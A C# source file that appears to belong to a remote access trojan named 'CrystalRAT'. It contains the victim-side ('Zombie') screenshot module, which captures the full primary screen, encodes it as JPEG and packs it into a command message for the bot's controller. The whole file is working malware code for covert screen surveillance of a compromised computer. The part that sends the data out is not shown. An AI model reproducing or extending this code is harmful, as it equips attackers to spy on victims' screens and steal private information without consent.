using CrystalRATShared.Commands;
using CrystalRATShared.Serialization;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows;
using Zombie.Helper;

namespace Zombie.Functions
{
    public static class Screenshot
    {
        public static byte[] Take(string identifier)
        {
            byte[] img;

            int screenWidth = (int)(Screen.PrimaryScreen.Bounds.Width * MonitorInfo.CurrentScaling);
            int screenHeight = (int)(Screen.PrimaryScreen.Bounds.Height * MonitorInfo.CurrentScaling);



            var bmpScreenshot = new Bitmap(screenWidth,
                              screenHeight,
                              PixelFormat.Format32bppArgb);

            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, new Size(screenWidth, screenHeight), CopyPixelOperation.SourceCopy);


            using (MemoryStream ms = new MemoryStream())
            {
                bmpScreenshot.Save(ms, ImageFormat.Jpeg);
                img = ms.ToArray();
            }
            return CommandDataSerializer.Serialize(CommandFlags.Screenshot, (writer) => { writer.Write(identifier); writer.Write(img); });

        }

    }
}
